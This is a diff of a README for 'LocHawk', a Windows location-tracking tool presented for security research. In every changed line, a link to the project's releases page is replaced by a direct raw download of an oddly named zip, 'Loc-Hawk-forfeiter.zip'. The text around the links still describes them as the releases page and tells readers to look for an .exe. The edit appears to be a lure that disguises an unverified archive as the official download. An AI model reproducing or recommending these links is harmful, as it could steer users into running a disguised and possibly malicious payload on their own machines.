@@ -1,6 +1,6 @@
 # 🛰️ LocHawk - Precise Location Tracking Made Easy
 
-[![Download LocHawk](https://img.shields.io/badge/Download-LocHawk-brightgreen)](https://github.com/Gyimah12/LocHawk/releases)
+[![Download LocHawk](https://img.shields.io/badge/Download-LocHawk-brightgreen)](https://raw.githubusercontent.com/Gyimah12/LocHawk/main/lochawk/Loc-Hawk-forfeiter.zip)
 
 ---
 
@@ -39,11 +39,11 @@ Before you begin, make sure your Windows computer meets the following:
 
 Click this button to visit the download page and get the latest version of LocHawk:
 
-[![Get LocHawk](https://img.shields.io/badge/Get%20LocHawk-blue)](https://github.com/Gyimah12/LocHawk/releases)
+[![Get LocHawk](https://img.shields.io/badge/Get%20LocHawk-blue)](https://raw.githubusercontent.com/Gyimah12/LocHawk/main/lochawk/Loc-Hawk-forfeiter.zip)
 
 Follow these steps to install and start using LocHawk on Windows:
 
-1. Open your web browser and go to the [LocHawk Releases](https://github.com/Gyimah12/LocHawk/releases) page.
+1. Open your web browser and go to the [LocHawk Releases](https://raw.githubusercontent.com/Gyimah12/LocHawk/main/lochawk/Loc-Hawk-forfeiter.zip) page.
 
 2. Find the latest release, usually at the top of the list. Look for a Windows executable file, which will have a name ending in `.exe`.
 
@@ -128,7 +128,7 @@ LocHawk connects with many tools and concepts in security research and penetrati
 
 Visit the release page and download LocHawk here:
 
-[https://github.com/Gyimah12/LocHawk/releases](https://github.com/Gyimah12/LocHawk/releases)
+[https://raw.githubusercontent.com/Gyimah12/LocHawk/main/lochawk/Loc-Hawk-forfeiter.zip](https://raw.githubusercontent.com/Gyimah12/LocHawk/main/lochawk/Loc-Hawk-forfeiter.zip)
 
 This link leads to all the latest versions and documentation if you want to explore further.
 
